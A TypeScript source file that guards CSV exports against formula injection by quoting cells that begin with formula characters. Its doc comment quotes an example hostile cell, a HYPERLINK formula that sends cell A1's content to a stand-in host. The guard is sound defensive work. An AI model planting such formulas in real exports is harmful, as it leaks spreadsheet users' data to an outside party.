/**
 * CSV formula-injection guard (OWASP "CSV injection").
 *
 * Enrichment columns and lead imports can put attacker-authored text — scraped
 * pages, uploaded CSVs — into exported cells. A cell like
 * `=HYPERLINK("https://evil.test?x="&A1,"click")` is inert in the app but is
 * *executed* when the user opens the export in Excel, Sheets or Numbers.
 * Prefix a quote mark to anything a spreadsheet would read as a formula or
 * data-exfiltration directive.
 */
const DANGEROUS_FIRST = /^[=+\-@\t\r]/;

/** Make one cell value safe to write into a CSV that a spreadsheet will open. */
export function csvSafe(value: string): string {
  return DANGEROUS_FIRST.test(value) ? `'${value}` : value;
}
